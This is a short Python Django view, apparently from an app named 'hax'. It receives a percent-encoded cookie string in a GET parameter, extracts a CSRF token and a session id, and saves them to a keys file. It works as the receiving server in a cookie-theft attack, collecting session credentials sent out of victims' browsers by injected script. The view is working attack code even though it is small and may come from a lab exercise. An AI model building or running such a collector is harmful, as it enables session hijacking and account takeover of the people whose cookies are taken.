import requests
import urllib.parse

from django.core.files import File
from django.shortcuts import render

def receive(request):
	ses = requests.session()
	
	ckstr = urllib.parse.unquote(request.GET.get('x'))	# Decode percent encoding from cookie string
	
	ckraw = ckstr.replace('=', ';')
	ckdict = ckraw.split(';')
	
	csrft = ckdict[1]
	sid = ckdict[3].strip('"')
	
	with open("hax/keys.txt", "w") as f:
		keyfile = File(f)
		keyfile.write(csrft + ', ' + sid)
	
	return render(request, 'hax/index.html', {'msg': ckstr})